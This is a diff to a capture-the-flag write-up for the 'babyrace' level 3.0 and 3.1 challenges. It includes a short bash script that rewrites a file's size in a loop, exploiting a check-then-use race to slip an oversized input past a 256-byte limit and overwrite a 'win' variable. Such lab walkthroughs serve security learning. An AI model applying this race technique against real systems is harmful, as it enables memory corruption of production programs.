@@ -30,3 +30,32 @@
         /challenge/babyrace_level$1 my_file | grep 'pwn'
     done
     ```
+
+## babyrace_level3.0
+
+- Corrupt memory by exploiting a race condition
+
+    ```
+    This challenge will verify that the file's path does not include "flag".
+    This challenge will verify that the file is not a symlink.
+    This challenge will verify that the file is not larger than 256 bytes.
+    ```
+
+- First, input a simple file, the hint is: `Value of "win" variable: 0`. The program limits the size of the input file to 256 bytes, I guess that with a larger file we can overwrite the value of `win` to non-zero
+
+- Use a script to change the size of `my_file` repeatedly, and run the challenge for a few times
+
+    ```shell
+    #!/bin/bash
+
+    touch my_file
+    for i in {0..100000}
+    do
+        printf 'a%.0s' {1..900} > my_file
+        printf '' > my_file
+    done
+    ```
+
+## babyrace_level3.1
+
+- Use the script in level 3.0
